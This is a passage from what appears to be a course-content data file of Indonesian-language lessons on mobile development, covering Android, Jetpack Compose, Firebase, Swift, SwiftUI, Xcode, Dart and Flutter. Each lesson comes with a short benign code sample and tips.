             "- `CoroutineScope`: Menentukan masa hidup coroutine (misal sejajar dengan Activity lifecycle).\n- `Dispatchers.IO`: Memindahkan eksekusi tugas ke thread khusus I/O (Database & Network).\n- `suspend fun`: Fungsi khusus yang dapat dihentikan sementara dan dilanjutkan kembali tanpa memblokir thread.",
             "Selalu gunakan `Dispatchers.IO` untuk operasi jaringan dan `Dispatchers.Main` untuk pembaruan UI."),
        ],

        "Android Studio Setup": [
            ("Instalasi & Anatomi Proyek Android Studio",
             "Mengenal IDE resmi Android Studio dan struktur direktori proyek aplikasi Android modern.",
             "Langkah awal untuk memulai pengembangan aplikasi native Android.",
             "text",
             "STRUKTUR PROYEK ANDROID:\napp/\n├── manifests/AndroidManifest.xml # Registrasi komponen & izin OS\n├── java/com/example/app/         # File kode Kotlin/Java\n└── res/                          # Aset gambar, warna, & string\n    ├── drawable/                 # Gambar & ikon SVG\n    ├── values/colors.xml         # Token warna UI\n    └── values/strings.xml        # Teks Lokalisasi Bahasa",
             "- AndroidManifest.xml: File manifes utama yang mendaftarkan nama paket, Activity, dan izin internet.\n- `res/`: Folder penyimpan seluruh aset non-kode aplikasi Android.",
             "Gunakan file `strings.xml` untuk menampung seluruh teks aplikasi agar mendukung fitur multi-bahasa."),

            ("Mengelola Build System dengan Gradle",
             "Gradle adalah mesin otomatisasi pembangun aplikasi dan pengelola library dependensi Android.",
             "Memungkinkan penambahan pustaka pihak ketiga dan pengawasan versi kompiler aplikasi.",
             "groovy",
             "// File: app/build.gradle.kts\nplugins {\n    id(\"com.android.application\")\n    id(\"org.jetbrains.kotlin.android\")\n}\n\ndependencies {\n    implementation(\"androidx.core:core-ktx:1.12.0\")\n    implementation(\"com.squareup.retrofit2:retrofit:2.9.0\") // Library REST API\n}",
             "- Version Catalog (`libs.versions.toml`): Cara modern mengelola versi dependensi terpusat di Gradle.\n- `dependencies`: Blok tempat mendaftarkan library external yang akan diunduh proyek.",
             "Gunakan Gradle Kotlin DSL (`build.gradle.kts`) untuk autocompletion script build yang lebih baik."),

            ("Konfigurasi Android Manifest & Permissions",
             "Meminta izin sistem (Permissions) seperti akses Internet, Kamera, atau Lokasi kepada pengguna.",
             "Memastikan aplikasi mematuhi standar privasi dan keamanan sistem operasi Android.",
             "xml",
             "<!-- File: AndroidManifest.xml -->\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\">\n    <!-- Wajib untuk Aplikasi yang Butuh Koneksi API -->\n    <uses-permission android:name=\"android.permission.INTERNET\" />\n    \n    <application\n        android:allowBackup=\"true\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\">\n    </application>\n</manifest>",
             "- `<uses-permission>`: Mendeklarasikan izin akses yang dibutuhkan aplikasi.\n- Runtime Permission: Izin berbahaya (seperti Kamera/GPS) wajib dimintakan persetujuan saat aplikasi berjalan.",
             "Hanya minta izin yang benar-benar dibutuhkan oleh fitur aplikasi demi menjaga kepercayaan pengguna."),

            ("Siklus Hidup (Lifecycle) Activity & Debugging",
             "Activity mengalami tahap `onCreate`, `onStart`, `onResume`, `onPause`, `onStop`, hingga `onDestroy`.",
             "Penting untuk mengelola penghematan baterai dan mencegah kebocoran memori saat HP diputar (rotate).",
             "kotlin",
             "class MainActivity : ComponentActivity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        Log.d(\"LIFECYCLE\", \"onCreate: Activity Mulai Dibuat\")\n    }\n\n    override fun onPause() {\n        super.onPause()\n        Log.d(\"LIFECYCLE\", \"onPause: Aplikasi Masuk Latar Belakang\")\n    }\n}",
             "- Logcat (`Log.d()`): Jendela pemantau log debug di Android Studio.\n- Configuration Change: Peristiwa putar layar yang merestart Activity dari awal jika tidak dikelola dengan benar.",
             "Manfaatkan `ViewModel` untuk menyimpan data UI agar tidak hilang saat terjadi perubahan rotasi layar."),
        ],

        "Jetpack Compose UI": [
            ("Konsep Declarative UI dengan Jetpack Compose",
             "Jetpack Compose menggantikan XML dengan pendekatan UI Deklaratif murni berbasis fungsi Kotlin.",
             "Mempercepat pembuatan antarmuka Android hingga 50% lebih ringkas dan intuitif.",
             "kotlin",
             "import androidx.compose.material3.Text\nimport androidx.compose.runtime.Composable\n\n@Composable\nfun GreetingCard(name: String) {\n    Text(text = \"Halo $name, Selamat Belajar Compose!\")\n}",
             "- `@Composable`: Anotasi yang menandai bahwa fungsi tersebut bertugas merender elemen UI ke layar.\n- Declarative UI: Kamu menggambarkan *bagaimana* tampilan harus terlihat berdasarkan state saat ini.",
             "Buat fungsi Composable independen yang tidak bergantung langsung pada Activity."),

            ("Layout Composables: Column, Row, dan Box",
             "Tiga komponen layout dasar Compose untuk menata elemen secara vertikal, horizontal, atau bertumpuk.",
             "Menyusun tata letak antarmuka aplikasi Android yang responsif dan indah.",
             "kotlin",
             "import androidx.compose.foundation.layout.*\nimport androidx.compose.runtime.Composable\n\n@Composable\nfun UserProfileItem() {\n    Row(modifier = Modifier.padding(16.dp)) {\n        // Foto profil dan Teks disusun sejajar horizontal\n        Column {\n            Text(text = \"Nama User\", fontWeight = FontWeight.Bold)\n            Text(text = \"Frontend Developer\")\n        }\n    }\n}",
             "- `Column`: Menata komponen anak secara vertikal (ke atas-bawah).\n- `Row`: Menata komponen anak secara horizontal (ke kiri-kanan).\n- `Box`: Menata komponen anak bertumpuk di atas satu sama lain (Z-axis).",
             "Gunakan `LazyColumn` untuk menampilkan daftar list data panjang agar hemat memori RAM."),

            ("State Management di Compose (remember & mutableStateOf)",
             "State adalah pendorong utama perubahan UI di Compose; saat state berubah, UI otomatis Re-compose.",
             "Membuat antarmuka interaktif yang langsung merespons input dan klik pengguna.",
             "kotlin",
             "import androidx.compose.runtime.*\nimport androidx.compose.material3.Button\nimport androidx.compose.material3.Text\n\n@Composable\nfun ClickCounter() {\n    var count by remember { mutableStateOf(0) }\n\n    Button(onClick = { count++ }) {\n        Text(text = \"Sudah diklik: $count kali\")\n    }\n}",
             "- `mutableStateOf`: Membuat penampung nilai state yang dapat diobservasi oleh mesin Compose.\n- `remember`: Mempertahankan nilai state agar tidak ter-reset saat fungsi ter-recompose.",
             "Manfaatkan `rememberSaveable` agar nilai state tetap bertahan meskipun HP diputar (rotasi layar)."),

            ("Styling, Modifiers & Custom Themes",
             "Modifiers mengatur ukuran, jarak (padding), latar belakang, klik, dan animasi elemen Compose.",
             "Membuat tampilan aplikasi sesuai dengan standar Material Design 3 teranyar.",
             "kotlin",
             "import androidx.compose.ui.Modifier\nimport androidx.compose.ui.unit.dp\nimport androidx.compose.foundation.background\nimport androidx.compose.ui.graphics.Color\nimport androidx.compose.foundation.shape.RoundedCornerShape\n\n@Composable\nfun StyledCard() {\n    Box(\n        modifier = Modifier\n            .fillMaxWidth()\n            .padding(16.dp)\n            .background(Color(0xFF1E293B), shape = RoundedCornerShape(12.dp))\n            .padding(24.dp)\n    ) {\n        Text(\"Kartu Berkelas\", color = Color.White)\n    }\n}",
             "- `Modifier`: Rantai instruksi styling yang dieksekusi secara berurutan dari atas ke bawah.\n- `fillMaxWidth()`: Mengatur lebar elemen agar memenuhi kontainer pembungkusnya.",
             "Urutan pemanggilan fungsi di dalam `Modifier` sangat mempengaruhi hasil visual akhir!"),
        ],

        "Firebase Integration": [
            ("Menghubungkan Aplikasi Android dengan Firebase",
             "Firebase adalah platform Backend-as-a-Service (BaaS) buatan Google untuk pengembang mobile.",
             "Menyediakan infrastruktur database, autentikasi, dan pengiriman notifikasi tanpa perlu membangun server backend sendiri.",
             "json",
             "/* File Konfigurasi: app/google-services.json */\n{\n  \"project_info\": {\n    \"project_number\": \"123456789\",\n    \"project_id\": \"learnwithacel-app\",\n    \"storage_bucket\": \"learnwithacel-app.appspot.com\"\n  },\n  \"client\": [{\n    \"client_info\": { \"mobilesdk_app_id\": \"1:12345:android:abcd\" }\n  }]\n}",
             "- `google-services.json`: File kunci rahasia yang mengautentikasi proyek Android dengan Firebase Console.\n- Google Services Plugin: Plugin Gradle yang membaca file konfigurasi `google-services.json`.",
             "Daftarkan SHA-1 fingerprint aplikasi Android-mu di Firebase Console untuk mengaktifkan Google Sign-In."),

            ("Autentikasi Pengguna dengan Firebase Auth",
             "Implementasi fitur Login & Register berbasis Email/Password dan Social Login secara instan.",
             "Menyederhanakan pengelolaan sesi pengguna dengan keamanan standar Google.",
             "kotlin",
             "import com.google.firebase.auth.FirebaseAuth\n\nval auth = FirebaseAuth.getInstance()\n\nfun registerUser(email: String, pass: String) {\n    auth.createUserWithEmailAndPassword(email, pass)\n        .addOnCompleteListener { task ->\n            if (task.isSuccessful) {\n                println(\"Register Berhasil!\")\n            } else {\n                println(\"Gagal: ${task.exception?.message}\")\n            }\n        }\n}",
             "- `FirebaseAuth`: Singleton instance pengelola autentikasi pengguna Firebase.\n- `createUserWithEmailAndPassword`: Fungsi bawaan untuk pendaftaran pengguna baru.",
             "Selalu kirim email verifikasi (`user.sendEmailVerification()`) setelah pendaftaran sukses."),

            ("Menyimpan Data Real-time dengan Cloud Firestore",
             "Firestore adalah database NoSQL berbasis dokumen cloud yang mensinkronisasi data secara real-time.",
             "Memungkinkan pembaruan data instan di layar pengguna tanpa perlu me-refresh halaman.",
             "kotlin",
             "import com.google.firebase.firestore.FirebaseFirestore\n\nval db = FirebaseFirestore.getInstance()\n\nfun saveNoteToCloud(title: String, content: String) {\n    val note = hashMapOf(\"title\" to title, \"content\" to content)\n    db.collection(\"notes\").add(note)\n        .addOnSuccessListener { println(\"Catatan Tersimpan di Firestore!\") }\n}",
             "- Collection & Document: Struktur hierarki penyimpanan NoSQL pada Cloud Firestore.\n- Real-time Listener (`addSnapshotListener`): Mendengarkan perubahan data secara langsung.",
             "Atur Firestore Security Rules untuk membatasi izin baca-tulis data hanya bagi pemilik akun yang sah."),

            ("Mengirim Push Notifications dengan Firebase Cloud Messaging",
             "Firebase Cloud Messaging (FCM) memungkinkan pengiriman pesan notifikasi ke smartphone pengguna.",
             "Meningkatkan retensi dan interaksi pengguna (User Engagement) kembali ke aplikasi.",
             "kotlin",
             "import com.google.firebase.messaging.FirebaseMessagingService\nimport com.google.firebase.messaging.RemoteMessage\n\nclass MyFCMService : FirebaseMessagingService() {\n    override fun onMessageReceived(remoteMessage: RemoteMessage) {\n        val title = remoteMessage.notification?.title\n        val body = remoteMessage.notification?.body\n        println(\"Notifikasi Diterima: $title - $body\")\n    }\n}",
             "- Registration Token: Token identitas unik untuk setiap perangkat HP yang diinstal aplikasi.\n- Notification Payload: Berisi judul, pesan teks, dan gambar yang akan muncul di tray notifikasi Android.",
             "Gunakan Android Notification Channels untuk mengategorikan jenis notifikasi di Android 8.0+."),
        ],

        "Swift Fundamentals": [
            ("Sintaks Dasar Swift, Type Safety & Optionals",
             "Swift adalah bahasa pemrograman modern buatan Apple yang sangat cepat, aman, dan intuitif.",
             "Bahasa utama dalam membangun aplikasi ekosistem Apple (iOS, macOS, watchOS).",
             "swift",
             "// 1. Variabel Constant (let) & Variable (var)\nlet appTitle = \"LearnWithAcel\"\nvar activeStudents = 500\n\n// 2. Optionals (Nil-Safety)\nvar optionalEmail: String? = \"acel@example.com\"\nif let safeEmail = optionalEmail {\n    print(\"Email pengguna: \\(safeEmail)\")\n}",
             "- `let` vs `var`: `let` adalah nilai konstan permanen; `var` dapat diubah nilainya.\n- Optional Binding (`if let`): Buka pembungkus Optional secara aman tanpa risiko crash `nil`.",
             "Selalu utamakan penggunaan `let` untuk mencegah efek samping mutasi variabel yang tidak disengaja."),

            ("Control Flow, Structures & Classes di Swift",
             "Swift mendukung paradigma Berbasis Objek (Class) dan Nilai (Struct).",
             "Memahami kapan menggunakan Struct (Value Type) dan Class (Reference Type) di iOS.",
             "swift",
             "// Struct (Value Type - Disalin saat dikirim)\nstruct StudentStruct {\n    var name: String\n}\n\n// Class (Reference Type - Berbagi referensi memori)\nclass TeacherClass {\n    var name: String\n    init(name: String) { self.name = name }\n}",
             "- Value Types (Struct): Setiap variabel memiliki salinan data sendiri secara independen.\n- Reference Types (Class): Beberapa variabel menunjuk ke lokasi memori instance objek yang sama.",
             "Di Swift/SwiftUI, utamakan penggunaan Struct secara default demi efisiensi performa memori."),

            ("Protocols & Extensions untuk Modular Code",
             "Protocols ibarat kontrak perjanjian yang menetapkan fungsi wajib, dan Extensions menambah fitur baru.",
             "Mewujudkan paradigma Protocol-Oriented Programming (POP) khas bahasa Swift.",
             "swift",
             "protocol IdentifiableUser {\n    var id: String { get }\n}\n\nextension String {\n    func isValidEmail() -> Bool {\n        return self.contains(\"@\") && self.contains(\".\")\n    }\n}\n\nprint(\"test@acel.com\".isValidEmail()) // Output: true",
             "- Protocol: Menetapkan cetak biru properti dan method tanpa memberikan implementasinya.\n- Extension: Menambahkan fungsionalitas baru pada tipe data yang sudah ada (bahkan pada tipe bawaan seperti String).",
             "Gunakan Extension untuk memisahkan implementasi Protocol agar file kode tetap rapi."),

            ("Closures & Functional Programming di Swift",
             "Closures adalah blok fungsi mandiri yang dapat dikirimkan sebagai argumen di dalam kode Swift.",
             "Sangat fleksibel untuk mengolah koleksi data array menggunakan fungsi tingkat tinggi (map, filter).",
             "swift",
             "let scores = [80, 55, 92, 40, 78]\n\n// Menggunakan Closure & Map Filter\nlet passingScores = scores.filter { $0 >= 70 }\nlet formattedScores = passingScores.map { \"Nilai: \\($0)\" }\n\nprint(formattedScores) // Output: [\"Nilai: 80\", \"Nilai: 92\", \"Nilai: 78\"]",
             "- Shorthand Argument (`$0`, `$1`): Cara singkat mengakses argumen closure tanpa menuliskan namanya.\n- High-Order Functions (`filter`, `map`, `reduce`): Fungsi fungsional untuk transformasi koleksi data.",
             "Gunakan `[weak self]` di dalam closure async untuk mencegah kebocoran memori (Retain Cycle)."),
        ],

        "SwiftUI Essentials": [
            ("Pengenalan Declarative UI dengan SwiftUI",
             "SwiftUI adalah framework modern buatan Apple untuk merancang UI secara deklaratif di seluruh perangkat Apple.",
             "Menulis kode UI yang jauh lebih sedikit dibanding Storyboard / UIKit terdahulu.",
             "swift",
             "import SwiftUI\n\nstruct ContentView: View {\n    var body: some View {\n        Text(\"Selamat Datang di SwiftUI!\")\n            .font(.title)\n            .foregroundColor(.blue)\n            .padding()\n    }\n}",
             "- `View Protocol`: Komponen dasar penyusun antarmuka visual aplikasi di SwiftUI.\n- `body`: Properti wajib yang mengembalikan struktur tampilan antarmuka.",
             "Gunakan Xcode Canvas Preview untuk melihat perubahan tampilan UI secara live saat mengetik kode."),

            ("Menggunakan Views, Modifiers & Layouts",
             "Menyusun tata letak antarmuka dengan VStack, HStack, dan ZStack beserta kustomisasi Modifiers.",
             "Membangun tampilan aplikasi iOS yang presisi, responsif, dan elegan.",
             "swift",
             "struct ProfileView: View {\n    var body: some View {\n        VStack(spacing: 16) {\n            HStack {\n                Image(systemName: \"person.circle.fill\")\n                    .resizable()\n                    .frame(width: 50, height: 50)\n                Text(\"Marchelino\")\n                    .font(.headline)\n            }\n        }\n        .padding()\n    }\n}",
             "- `VStack`: Menyusun komponen anak secara vertikal.\n- `HStack`: Menyusun komponen anak secara horizontal.\n- `ZStack`: Menyusun komponen anak bertumpuk secara kedalaman.",
             "Modifiers di SwiftUI dibaca dari atas ke bawah; urutan modifiers mengubah hasil akhir tampilan."),

            ("State Management dengan @State & @Binding",
             "Manajemen data lokal menggunakan pembungkus properti `@State` dan pendistribusiannya via `@Binding`.",
             "Memastikan antarmuka merespons secara otomatis ketika terjadi perubahan nilai data.",
             "swift",
             "struct ToggleView: View {\n    @State private var isOn: Bool = false\n    \n    var body: some View {\n        Toggle(isOn: $isOn) {\n            Text(\"Mode Gelap: \\(isOn ? \"Aktif\" : \"Mati\")\")\n        }\n        .padding()\n    }\n}",
             "- `@State`: Pembungkus properti untuk menyimpan state lokal sederhana di dalam satu View.\n- `$` Syntax (`$isOn`): Mengirimkan referensi dua arah (Binding) ke komponen input.",
             "Selalu tandai properti `@State` sebagai `private` agar tidak bisa diakses dari luar View."),

            ("Navigasi & List Data dengan NavigationStack",
             "Menampilkan daftar data dinamis menggunakan `List` dan mengelola perpindahan halaman via `NavigationStack`.",
             "Membangun alur navigasi multi-halaman standar pada aplikasi iOS modern.",
             "swift",
             "struct BookListView: View {\n    let books = [\"Belajar Swift\", \"SwiftUI Expert\", \"iOS Security\"]\n    \n    var body: some View {\n        NavigationStack {\n            List(books, id: \\.self) { book in\n                NavigationLink(book, value: book)\n            }\n            .navigationTitle(\"Daftar Buku\")\n        }\n    }\n}",
             "- `NavigationStack`: Kontainer navigasi utama di iOS 16+ pengganti NavigationView lama.\n- `NavigationLink`: Komponen pemicu perpindahan ke halaman detail saat item ditekan.",
             "Gunakan `NavigationStack` untuk performa navigasi yang lebih lancar pada list data besar."),
        ],

        "Xcode Workflow": [
            ("Navigasi Workspace Xcode & Inspector Windows",
             "Mengenal IDE resmi Apple, Xcode, dan panel-panel pendukung alur kerja pengembang iOS.",
             "Meningkatkan efisiensi kerja dalam mengelola proyek aplikasi Apple.",
             "text",
             "PANEL UTAMA XCODE:\n1. Navigator Area (Kiri)  : Navigasi file proyek, pencarian, dan breakpoint debug\n2. Editor Area (Tengah)  : Tempat menulis kode Swift dan tampilan Canvas Live Preview\n3. Inspectors (Kanan)    : Pengaturan rincian atribut file dan properti UI\n4. Debug Area (Bawah)    : Konsol keluaran log dan variabel status execution",
             "- Xcode Canvas: Fitur pratinjau antarmuka SwiftUI secara real-time tanpa perlu menjalankan simulator.\n- Project Navigator (`Cmd+1`): Shortcut cepat membuka panel daftar file proyek.",
             "Kuasai shortcut keyboard Xcode (seperti `Cmd+R` untuk Run) untuk mempercepat proses koding."),

            ("Running App di iOS Simulator & Physical Device",
             "Menjalankan dan menguji aplikasi buatanmu di iOS Simulator atau langsung di iPhone milikmu.",
             "Memastikan performa dan tampilan aplikasi berjalan sempurna pada berbagai ukuran layar iPhone.",
             "text",
             "LANGKAH UJI COBA PERANGKAT:\n1. Pilih target simulator (misal: iPhone 15 Pro) dari baris atas Xcode\n2. Tekan tombol 'Play' (Cmd+R) untuk membangun dan menjalankan aplikasi\n3. Untuk Perangkat Fisik: Hubungkan iPhone via kabel USB -> Aktifkan Developer Mode di HP -> Pilih iPhone di Xcode",
             "- iOS Simulator: Emulator perangkat Apple berbasis arsitektur komputer lokal.\n- Developer Mode: Fitur keamanan di iOS 16+ yang wajib diaktifkan sebelum meng-install aplikasi debug.",
             "Lakukan pengujian akhir selalu pada perangkat fisik iPhone untuk mengukur performa asli baterai dan memori."),

            ("Mengelola Dependensi dengan Swift Package Manager (SPM)",
             "Swift Package Manager (SPM) adalah alat resmi bawaan Apple untuk mengelola pustaka pihak ketiga.",
             "Memudahkan penambahan dependensi library eksternal secara aman dan terintegrasi langsung di Xcode.",
             "swift",
             "// Menambahkan Swift Package via URL di Xcode:\n// File -> Add Package Dependencies...\n// URL: https://github.com/Alamofire/Alamofire.git\n\nimport Alamofire\n\nAF.request(\"https://api.example.com/data\").responseJSON { response in\n    debugPrint(response)\n}",
             "- SPM Integration: Tidak membutuhkan instalasi CLI eksternal seperti CocoaPods; terintegrasi murni di file `.xcodeproj`.\n- Package.resolved: File pengunci versi spesifik library agar build tetap konsisten di semua komputer pengembang.",
             "Utamakan pengunaan SPM dibanding CocoaPods untuk manajemen dependensi di proyek iOS baru."),

            ("App Signing, Provisioning Profile & Build Settings",
             "Memahami mekanisme keamanan Apple untuk menandatangani digital aplikasi sebelum dipublikasikan.",
             "Langkah wajib untuk dapat menyebarkan aplikasi ke TestFlight dan App Store.",
             "text",
             "ELEMEN KEAMANAN APPLE DISTRIBUTION:\n- Apple Developer Account: Akun pengembang resmi Apple ($99/tahun)\n- Signing Certificate  : Sertifikat digital yang mengonfirmasi identitas pembuat aplikasi\n- App ID                 : Identitas unik paket aplikasi (misal: com.acel.learnapp)\n- Provisioning Profile   : Dokumen penyuplai izin yang mengaitkan Sertifikat, App ID, dan Perangkat HP",
             "- Automatic Signing: Fitur Xcode yang mengelola pembuatan sertifikat dan profile secara otomatis.\n- TestFlight: Platform pengujian beta resmi Apple untuk menguji aplikasi sebelum rilis publik.",
             "Aktifkan 'Automatically manage signing' di Xcode untuk kemudahan pengelolaan kredensial."),
        ],

        "iOS App State": [
            ("Data Flow Lanjutan: @StateObject & @EnvironmentObject",
             "Pengelolaan data terpusat antar halaman aplikasi menggunakan `@StateObject` dan `@EnvironmentObject`.",
             "Memungkinkan pengiriman state aplikasi secara global tanpa perlu meneruskannya via initializer.",
             "swift",
             "import SwiftUI\n\nclass UserData: ObservableObject {\n    @Published var username = \"Acel\"\n}\n\nstruct MainApp: App {\n    @StateObject var userData = UserData()\n    \n    var body: some Scene {\n        WindowGroup {\n            ContentView()\n                .environmentObject(userData) // Inject Global State\n        }\n    }\n}",
             "- `@StateObject`: Membuat dan mempertahankan instance ObservableObject di dalam View induk.\n- `@EnvironmentObject`: Membaca data state global yang di-inject dari tingkatan induk teratas.",
             "Gunakan `@StateObject` saat menginisialisasi objek data pertama kali dan `@ObservedObject` untuk mengonsumsinya."),

            ("Networking dengan URLSession & Async/Await Swift",
             "Mengambil data dari API backend menggunakan API modern `URLSession` dan `async/await` Swift 5.5+.",
             "Membuat kode pemanggilan jaringan yang sangat rapi, aman, dan mudah ditangani jika terjadi error.",
             "swift",
             "struct UserProfile: Codable {\n    let id: String\n    let name: String\n}\n\nfunc fetchProfile() async throws -> UserProfile {\n    guard let url = URL(string: \"https://api.example.com/profile\") else { throw URLError(.badURL) }\n    let (data, _) = try await URLSession.shared.data(from: url)\n    return try JSONDecoder().decode(UserProfile.self, from: data)\n}",
             "- `Codable`: Protocol gabungan `Encodable` & `Decodable` untuk otomatisasi serialisasi JSON di Swift.\n- `try await URLSession.shared.data`: Mengambil data jaringan secara asynchronous non-blocking.",
             "Gunakan `JSONDecoder().keyDecodingStrategy = .convertFromSnakeCase` untuk otomatis mengubah format JSON snake_case ke camelCase."),

            ("Penyimpanan Data Lokal dengan SwiftData / CoreData",
             "Menyimpan data aplikasi secara permanen di dalam penyimpanan lokal HP menggunakan SwiftData.",
             "Memungkinkan aplikasi tetap berfungsi dan menampilkan data meskipun dalam keadaan offline.",
             "swift",
             "import SwiftData\nimport SwiftUI\n\n@Model\nclass Bookmark {\n    var title: String\n    var createdAt: Date\n    \n    init(title: String) {\n        self.title = title\n        self.createdAt = Date()\n    }\n}\n// Di View: @Query var bookmarks: [Bookmark]",
             "- `@Model`: Anotasi SwiftData di iOS 17+ untuk mengubah class Swift biasa menjadi tabel database lokal.\n- `@Query`: Memanggil dan mengobservasi data dari SwiftData ke UI secara real-time.",
             "SwiftData adalah pengganti modern berbasis kode untuk CoreData klasik pada iOS 17+."),

            ("Memahami iOS App Life Cycle & Background Events",
             "Merespons peristiwa peralihan status aplikasi dari Aktif (Active), Latar Belakang (Background), atau Mati.",
             "Menyimpan draf data secara otomatis dan mematikan timer ketika aplikasi ditinggalkan pengguna.",
             "swift",
             "struct AppLifeCycleView: View {\n    @Environment(\\.scenePhase) var scenePhase\n    \n    var body: some View {\n        Text(\"Aplikasi Pemantau Lifecycle\")\n            .onChange(of: scenePhase) { newPhase in\n                if newPhase == .background {\n                    print(\"Aplikasi Masuk Latar Belakang - Simpan Data!\")\n                }\n            }\n    }\n}",
             "- `scenePhase`: Environment key di SwiftUI untuk mengamati fase hidup aplikasi saat ini.\n- `.background`: Fase aplikasi tidak tampak di layar; saat tepat untuk menyimpan data sensitif.",
             "Segera hentikan proses pemutaran audio/video atau pengambilan lokasi GPS saat masuk ke latar belakang."),
        ],

        "Dart Programming": [
            ("Sintaks Dasar Bahasa Dart & Type System",
             "Dart adalah bahasa pemrograman serbaguna ciptaan Google yang menjadi mesin penggerak utama Flutter.",
             "Mendukung kompilasi Ahead-Of-Time (AOT) untuk performa aplikasi yang super cepat.",
             "dart",
             "void main() {\n  // 1. Strongly Typed & Type Inference\n  String appName = 'LearnWithAcel';\n  var version = 1.0; // Otomatis terdeteksi sebagai double\n  \n  // 2. Sound Null Safety System\n  String? optionalUser;\n  print(optionalUser?.length ?? 0);\n}",
             "- Sound Null Safety: Dart menjamin variabel non-nullable tidak pernah berisi `null` saat aplikasi berjalan.\n- `??` (Null-aware operator): Memberikan nilai alternatif jika variabel di sebelah kiri bernilai `null`.",
             "Gunakan variabel berwujud `final` atau `const` untuk performa kompilasi yang lebih optimal."),

            ("Collections (List, Set, Map) & Control Flow",
             "Mengelola grup data menggunakan array (List), grup unik (Set), dan pasangan key-value (Map).",
             "Struktur data dasar yang digunakan untuk menampung seluruh daftar informasi aplikasi Flutter.",
             "dart",
             "void main() {\n  // List (Array Terurut)\n  List<String> fruits = ['Apel', 'Jeruk', 'Mangga'];\n  fruits.add('Pisang');\n  \n  // Map (Key-Value Pairs)\n  Map<String, dynamic> userMap = {\n    'name': 'Acel',\n    'age': 22,\n    'isVerified': true\n  };\n  \n  print('User: ${userMap['name']}');\n}",
             "- `List<T>`: Koleksi elemen terurut yang mengizinkan adanya nilai duplikat.\n- `Map<K, V>`: Koleksi pasangan kunci dan nilai, sangat mirip dengan format objek JSON.",
             "Manfaatkan Spread Operator (`...`) untuk mengombinasikan beberapa koleksi data dengan ringkas."),

            ("Object-Oriented Programming & Mixins di Dart",
             "Konsep pemrograman berbasis objek di Dart beserta fitur unik `Mixin` untuk berbagi fungsi antar-class.",
             "Memungkinkan pengubahan perilaku class tanpa memerlukan pewarisan berganda (Multiple Inheritance).",
             "dart",
             "mixin Logger {\n  void log(String msg) => print('[LOG] $msg');\n}\n\nclass Animal {\n  String name;\n  Animal(this.name);\n}\n\nclass Dog extends Animal with Logger {\n  Dog(String name) : super(name);\n  void bark() => log('$name Menggonggong!');\n}",
             "- `with`: Kata kunci khusus di Dart untuk menerapkan satu atau lebih Mixin pada suatu class.\n- Generics (`<T>`): Memungkinkan pembuatan class dan fungsi yang fleksibel menerima berbagai tipe data.",
             "Gunakan Mixin untuk kode utilitas yang ingin dipakai di banyak class berbeda tanpa relasi induk-anak."),

            ("Asynchronous Programming dengan Future & Stream",
             "Mengolah operasi bernilai masa depan menggunakan `Future` (satu nilai) dan `Stream` (deretan data dinamis).",
             "Landasan utama dalam mengolah koneksi REST API dan data real-time di aplikasi Flutter.",
             "dart",
             "Future<String> fetchUsername() async {\n  await Future.delayed(Duration(seconds: 2));\n  return 'Acel Developer';\n}\n\nvoid main() async {\n  print('Mengambil data...');\n  String name = await fetchUsername();\n  print('Nama Diterima: $name');\n}",
             "- `Future`: Merepresentasikan nilai tunggal yang baru akan tersedia di masa depan setelah proses async selesai.\n- `Stream`: Mengalirkan deretan data terus-menerus secara asynchronous (misal data sensor atau WebSocket).",
             "Selalu gunakan `try...catch` saat memanggil `await Future` untuk mengantisipasi kegagalan koneksi."),
        ],

        "Flutter UI Basics": [
            ("Konsep Everything is a Widget di Flutter",
             "Di Flutter, seluruh komponen antarmuka (teks, tombol, layout, bahkan warna padding) adalah sebuah Widget.",
             "Pendekatan desain yang konsisten di mana kamu menyusun hirarki Widget Tree untuk membuat tampilan.",
             "dart",
             "import 'package:flutter/material.dart';\n\nvoid main() => runApp(\n  MaterialApp(\n    home: Scaffold(\n      body: Center(\n        child: Text('Halo dari Flutter!'),\n      ),\n    ),\n  ),\n);",
             "- Widget Tree: Struktur pohon hierarki komponen UI dari akar (MaterialApp) hingga ke daun (Text).\n- `Scaffold`: Widget penyuplai struktur dasar tata letak Material Design (AppBar, Body, FloatingActionButton).",
             "Pahami perbedaan antara Widget tampilan (Text, Image) dan Widget tata letak (Container, Padding)."),

            ("Stateless vs Stateful Widgets Deep Dive",
             "StatelessWidget untuk tampilan statis tetap, StatefulWidget untuk tampilan yang dapat berubah data-nya.",
             "Memahami kapan harus memilih jenis widget yang tepat demi efisiensi penggunaan memori RAM.",
             "dart",
             "class CounterWidget extends StatefulWidget {\n  @override\n  _CounterWidgetState createState() => _CounterWidgetState();\n}\n\nclass _CounterWidgetState extends State<CounterWidget> {\n  int count = 0;\n  \n  @override\n  Widget build(BuildContext context) {\n    return ElevatedButton(\n      onPressed: () => setState(() => count++),\n      child: Text('Hitungan: $count'),\n    );\n  }\n}",
             "- `StatelessWidget`: Widget hemat memori yang tampilannya tidak pernah berubah setelah dibuat.\n- `setState()`: Fungsi wajib di StatefulWidget untuk memicu pembuatan ulang (re-build) antarmuka UI.",
             "Gunakan `StatelessWidget` sebanyak mungkin, gunakan `StatefulWidget` hanya saat ada mutasi data lokal UI."),

            ("Layouting dengan Container, Column, Row & Flex",
             "Menyusun tata letak antarmuka aplikasi Flutter secara horizontal, vertikal, dan kustom spasi.",
             "Membangun antarmuka aplikasi yang tampil konsisten di layar HP kecil hingga tablet besar.",
             "dart",
             "Widget build(BuildContext context) {\n  return Row(\n    mainAxisAlignment: MainAxisAlignment.spaceBetween,\n    children: [\n      Icon(Icons.star, color: Colors.amber),\n      Column(\n        crossAxisAlignment: CrossAxisAlignment.start,\n        children: [\n          Text('Rating Produk', style: TextStyle(fontWeight: FontWeight.bold)),\n          Text('4.9 dari 5.0 (120 Ulasan)'),\n        ],\n      ),\n    ],\n  );\n}",
             "- `Column` & `Row`: Menata widget anak secara vertikal atau horizontal.\n- `mainAxisAlignment`: Mengatur pembagian spasi di sepanjang sumbu utama layout.",
             "Gunakan `Expanded` atau `Flexible` di dalam Row/Column untuk mencegah error penuangan layar (Overflow Error)."),

            ("Building Interactive Forms & Input Validation",
             "Membuat formulir input teks, mengelola pengontrol (`TextEditingController`), dan validasi error data.",
             "Memastikan data masukan pengguna memenuhi kriteria sebelum dikirim ke backend server.",
             "dart",
